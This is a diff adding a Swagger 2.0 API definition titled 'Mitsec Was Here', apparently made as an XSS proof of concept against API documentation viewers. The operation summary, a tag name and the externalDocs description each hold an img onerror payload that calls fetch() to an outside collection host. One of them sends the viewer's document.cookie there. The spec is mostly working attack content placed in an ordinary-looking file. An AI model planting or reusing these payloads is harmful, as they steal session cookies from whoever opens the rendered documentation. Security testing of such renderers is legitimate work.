@@ -1,0 +1,31 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Mitsec Was Here",
+    "version": "1.0"
+  },
+  "paths": {
+    "/test": {
+      "get": {
+        "summary": "<img src=x:x onerror=fetch('https://xss.report/c/whoami?c='+document.cookie)>",
+        "description": "test",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        }
+      }
+    }
+  },
+  "tags": [
+    {
+      "name": "<img src=x onerror=fetch('https://xss.report/c/whoami?t=tag')>",
+      "description": "xss"
+    }
+  ],
+  "externalDocs": {
+    "description": "<img src=x onerror=fetch('https://xss.report/c/whoami?e=ext')>",
+    "url": "http://test.com"
+  }
+}
